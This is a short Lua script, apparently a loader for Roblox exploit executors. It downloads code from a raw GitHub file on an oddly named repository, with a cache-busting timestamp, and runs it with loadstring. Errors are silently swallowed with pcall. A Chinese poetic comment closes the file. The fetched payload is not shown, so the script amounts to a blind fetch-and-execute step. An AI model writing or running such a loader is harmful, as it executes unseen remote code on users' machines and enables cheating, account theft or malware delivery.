local scriptUrl = "https://raw.githubusercontent.com/wtf6701385-stack/-/main/A?t="..tick()

local function executeScript()
    local success, content = pcall(game.HttpGet, game, scriptUrl)
    if success and content then
        loadstring(content)()
    end
end

pcall(executeScript)

-- [[ ☀️ 光：不管鏡面內外，光都會照亮您回家的路。 ]] --
